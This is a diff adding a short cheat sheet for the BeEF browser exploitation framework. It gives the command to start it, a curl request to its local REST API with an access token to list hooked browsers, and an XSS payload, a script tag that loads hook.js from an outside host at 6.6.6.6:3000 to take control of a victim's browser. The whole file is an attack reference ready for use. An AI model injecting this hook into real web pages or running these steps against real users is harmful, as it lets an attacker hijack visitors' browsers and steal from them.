@@ -1,0 +1,11 @@
+# beef
+
+# run
+./beef -x
+
+# rest api
+curl -v 'http://127.0.0.1:3000/api/hooks/?token=df0bc70f0a9fdfff5d4a6dfcc93fed734cd480e7'
+
+# hook via xss
+<script type=text/javascript src=http://6.6.6.6:3000/hook.js></script>
+
